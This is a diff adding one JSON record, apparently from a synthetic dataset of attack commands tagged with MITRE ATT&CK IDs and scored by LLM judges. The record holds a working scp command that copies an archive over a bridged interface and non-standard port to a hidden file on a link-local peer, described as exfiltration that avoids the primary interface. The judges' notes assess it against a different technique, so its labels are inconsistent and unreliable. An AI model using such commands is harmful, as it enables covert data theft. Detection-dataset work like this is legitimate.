@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
+  "explanation": "Uses SSH file copy bound to the bridge0 interface IPv6 address and a high custom port to move data over a bridged, non-default medium, aligning with T1011 by avoiding the primary interface.",
+  "rationale_steps": [
+    "Obtain the IPv6 address of bridge0 via ipconfig to select a secondary medium.",
+    "Bind the SSH client to that address to force traffic over bridge0.",
+    "Transfer data to a link-local peer on a non-standard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-8073e46c",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper flag syntax, balanced quotes, valid command structure, and correct use of command substitution.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does use SCP over a non-default interface with IPv6 addressing which could help evade detection, it doesn't directly align with T1011 (Exfiltration Over Other Network Medium) rather than establishing accounts as described in the technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T08:54:25.118338Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for flags, command substitution, quoting, and IPv6 address formatting.",
+        "semantic_score": 1,
+        "semantic_justification": "The `scp` command is used for file transfer and does not create or establish accounts; it explicitly requires an existing account for authentication, making it misaligned with T1011 'Establish Accounts'.",
+        "combined_score": 3.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T08:54:30.641084Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed scp command with valid flags, balanced quoting, correct IPv6 literal/brackets, and proper command substitution.",
+        "semantic_score": 1,
+        "semantic_justification": "It transfers a file over SSH via a specific interface and port but does not create or abuse accounts, so it does not implement the described Establish Accounts technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T08:54:50.353901Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
